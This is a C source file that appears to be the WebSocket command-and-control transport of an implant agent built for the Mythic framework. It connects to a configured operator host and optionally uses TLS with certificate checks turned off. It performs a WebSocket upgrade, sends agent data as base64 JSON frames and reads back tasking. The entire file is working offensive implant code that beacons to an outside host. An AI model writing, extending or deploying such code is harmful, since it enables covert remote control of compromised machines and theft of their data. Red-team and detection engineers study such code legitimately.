#include "agent.h"
#include "b64.h"
#include "c2.h"
#include "cJSON.h"
#include "config.h"
#include "utils.h"
#include <wolfssl/ssl.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>

struct C2Config {
    char hostname[256];
    char path[256];
    char useragent[BUFSIZE];
    int  port;
    bool ssl;
};

// ---------------------------------------------------------------------------
// Lifecycle — wolfSSL global init/cleanup
// ---------------------------------------------------------------------------

void c2Setup(void)    { wolfSSL_Init(); }
void c2Teardown(void) { wolfSSL_Cleanup(); }

C2Config *createC2Config(void) {
    C2Config *cfg = calloc(1, sizeof(C2Config));
    if (!cfg) return NULL;
    strncpy(cfg->hostname, HOST_NAME, sizeof(cfg->hostname) - 1);
    cfg->port = PORT;
    cfg->ssl  = SSL_ENABLED;
    strncpy(cfg->useragent, USER_AGENT, sizeof(cfg->useragent) - 1);
    if (END_POINT[0] == '/') {
        strncpy(cfg->path, END_POINT, sizeof(cfg->path) - 1);
    } else {
        cfg->path[0] = '/';
        strncpy(cfg->path + 1, END_POINT, sizeof(cfg->path) - 2);
    }
    return cfg;
}

void destroyC2Config(C2Config *cfg) { free(cfg); }

#ifdef DEBUG
void printC2Config(C2Config *cfg) {
    DBGPRINT("{\nHOSTNAME: %s\nPATH: %s\nPORT: %d\nSSL: %d\n}\n",
             cfg->hostname, cfg->path, cfg->port, (int)cfg->ssl);
}
#endif

// ---------------------------------------------------------------------------
// Thin read/write abstraction over raw fd or wolfSSL
// ---------------------------------------------------------------------------

typedef struct { int fd; WOLFSSL *ssl; } Conn;

static int cwrite(Conn *c, const void *buf, int len) {
    return c->ssl ? wolfSSL_write(c->ssl, buf, len)
                  : (int)write(c->fd, buf, len);
}

static int cread(Conn *c, void *buf, int len) {
    return c->ssl ? wolfSSL_read(c->ssl, buf, len)
                  : (int)read(c->fd, buf, len);
}

// ---------------------------------------------------------------------------
// TCP connect
// ---------------------------------------------------------------------------

static int tcp_connect(const char *host, int port) {
    struct addrinfo hints = {0}, *res, *rp;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    char ps[8];
    snprintf(ps, sizeof(ps), "%d", port);
    if (getaddrinfo(host, ps, &hints, &res) != 0) return -1;
    int fd = -1;
    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

// ---------------------------------------------------------------------------
// HTTP header reader — reads until \r\n\r\n
// ---------------------------------------------------------------------------

static int read_headers(Conn *c, char *buf, int buflen) {
    int n = 0;
    while (n < buflen - 1) {
        int r = cread(c, buf + n, 1);
        if (r <= 0) return -1;
        n++;
        if (n >= 4 &&
            buf[n-4] == '\r' && buf[n-3] == '\n' &&
            buf[n-2] == '\r' && buf[n-1] == '\n') {
            buf[n] = '\0';
            return n;
        }
    }
    return -1;
}

// ---------------------------------------------------------------------------
// WebSocket framing
// Mythic wire format: {"data":"<base64>"} as a text frame.
// Client→server frames MUST be masked (RFC 6455 §5.3).
// ---------------------------------------------------------------------------

static int ws_send(Conn *c, const char *payload, size_t plen) {
    unsigned char hdr[14];
    int hlen;
    hdr[0] = 0x81; /* FIN + text */
    if (plen <= 125) {
        hdr[1] = 0x80 | (unsigned char)plen;
        hlen = 2;
    } else if (plen <= 65535) {
        hdr[1] = 0x80 | 126;
        hdr[2] = (plen >> 8) & 0xff;
        hdr[3] = plen & 0xff;
        hlen = 4;
    } else {
        hdr[1] = 0x80 | 127;
        for (int i = 0; i < 8; i++)
            hdr[2+i] = (unsigned char)(plen >> (56 - 8*i));
        hlen = 10;
    }
    /* 4-byte mask key appended to header */
    unsigned char mask[4];
    for (int i = 0; i < 4; i++) mask[i] = (unsigned char)(rand() & 0xff);
    hdr[hlen]   = mask[0]; hdr[hlen+1] = mask[1];
    hdr[hlen+2] = mask[2]; hdr[hlen+3] = mask[3];
    hlen += 4;

    unsigned char *mp = malloc(plen);
    if (!mp) return -1;
    for (size_t i = 0; i < plen; i++)
        mp[i] = (unsigned char)payload[i] ^ mask[i & 3];

    int ok = (cwrite(c, hdr, hlen) == hlen &&
              cwrite(c, mp, (int)plen) == (int)plen) ? 0 : -1;
    free(mp);
    return ok;
}

static char *ws_recv(Conn *c, size_t *out_len) {
    unsigned char h[2];
    if (cread(c, h, 2) != 2) return NULL;
    bool masked = (h[1] & 0x80) != 0;
    size_t len  = h[1] & 0x7f;
    if (len == 126) {
        unsigned char e[2];
        if (cread(c, e, 2) != 2) return NULL;
        len = ((size_t)e[0] << 8) | e[1];
    } else if (len == 127) {
        unsigned char e[8];
        if (cread(c, e, 8) != 8) return NULL;
        len = 0;
        for (int i = 0; i < 8; i++) len = (len << 8) | e[i];
    }
    unsigned char mask[4] = {0};
    if (masked && cread(c, mask, 4) != 4) return NULL;

    char *buf = malloc(len + 1);
    if (!buf) return NULL;
    size_t got = 0;
    while (got < len) {
        int n = cread(c, buf + got, (int)(len - got));
        if (n <= 0) { free(buf); return NULL; }
        got += (size_t)n;
    }
    buf[len] = '\0';
    if (masked) {
        for (size_t i = 0; i < len; i++) buf[i] ^= mask[i & 3];
    }
    *out_len = len;
    return buf;
}

// ---------------------------------------------------------------------------
// c2.h interface
// ---------------------------------------------------------------------------

int c2Send(Agent *agent, char *data, int len, MsgResp *resp) {
    (void)len;
    C2Config   *cfg  = agent->c2config;
    WOLFSSL_CTX *wctx = NULL;
    int          rc   = -1;

    int fd = tcp_connect(cfg->hostname, cfg->port);
    if (fd < 0) { DBGPRINT("ws: TCP connect failed"); return -1; }

    Conn conn = { .fd = fd, .ssl = NULL };

    if (cfg->ssl) {
        wctx = wolfSSL_CTX_new(wolfSSLv23_client_method());
        if (!wctx) goto out;
        wolfSSL_CTX_set_verify(wctx, WOLFSSL_VERIFY_NONE, NULL);
        conn.ssl = wolfSSL_new(wctx);
        if (!conn.ssl) goto out;
        wolfSSL_set_fd(conn.ssl, fd);
        if (wolfSSL_connect(conn.ssl) != WOLFSSL_SUCCESS) {
            DBGPRINT("ws: TLS handshake failed");
            goto out;
        }
    }

    /* WebSocket upgrade */
    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    unsigned char raw_key[16];
    for (int i = 0; i < 16; i++) raw_key[i] = (unsigned char)(rand() & 0xff);
    size_t klen = 0;
    char *ws_key = (char *)base64_encode(raw_key, 16, &klen);
    if (!ws_key) goto out;

    char req[1024];
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: %s\r\n"
        "\r\n",
        cfg->path, cfg->hostname, ws_key, cfg->useragent);
    free(ws_key);

    if (cwrite(&conn, req, req_len) != req_len) {
        DBGPRINT("ws: failed to send upgrade");
        goto out;
    }

    char hdr_buf[2048];
    if (read_headers(&conn, hdr_buf, sizeof(hdr_buf)) < 0 ||
        strstr(hdr_buf, "101") == NULL) {
        DBGPRINT("ws: upgrade rejected");
        goto out;
    }

    /* Wrap payload: {"data":"<base64>"} */
    cJSON *msg = cJSON_CreateObject();
    cJSON_AddStringToObject(msg, "data", data);
    char *json_str = cJSON_PrintUnformatted(msg);
    cJSON_Delete(msg);
    if (!json_str) goto out;

    int send_ok = ws_send(&conn, json_str, strlen(json_str));
    cJSON_free(json_str);
    if (send_ok != 0) { DBGPRINT("ws: send frame failed"); goto out; }

    /* Receive response frame */
    size_t rlen = 0;
    char *frame = ws_recv(&conn, &rlen);
    if (!frame) { DBGPRINT("ws: recv frame failed"); goto out; }

    cJSON *rjson = cJSON_ParseWithLength(frame, rlen);
    free(frame);
    if (rjson) {
        cJSON *rdata = cJSON_GetObjectItem(rjson, "data");
        if (cJSON_IsString(rdata) && rdata->valuestring) {
            size_t dl = strlen(rdata->valuestring);
            resp->response = malloc(dl + 1);
            if (resp->response) {
                memcpy(resp->response, rdata->valuestring, dl + 1);
                resp->size = dl;
                rc = 0;
            }
        }
        cJSON_Delete(rjson);
    }

    /* Send close frame (FIN + close opcode, 2-byte masked status 1000) */
    {
        unsigned char cf[8] = {0x88, 0x82, 0, 0, 0, 0, 0x03^0, 0xe8^0};
        cwrite(&conn, cf, sizeof(cf));
    }

out:
    if (conn.ssl) wolfSSL_free(conn.ssl);
    if (wctx)     wolfSSL_CTX_free(wctx);
    close(fd);
    return rc;
}

int c2Receive(Agent *agent, char *data, int len, MsgResp *resp) {
    (void)agent; (void)data; (void)len; (void)resp;
    return 0;
}
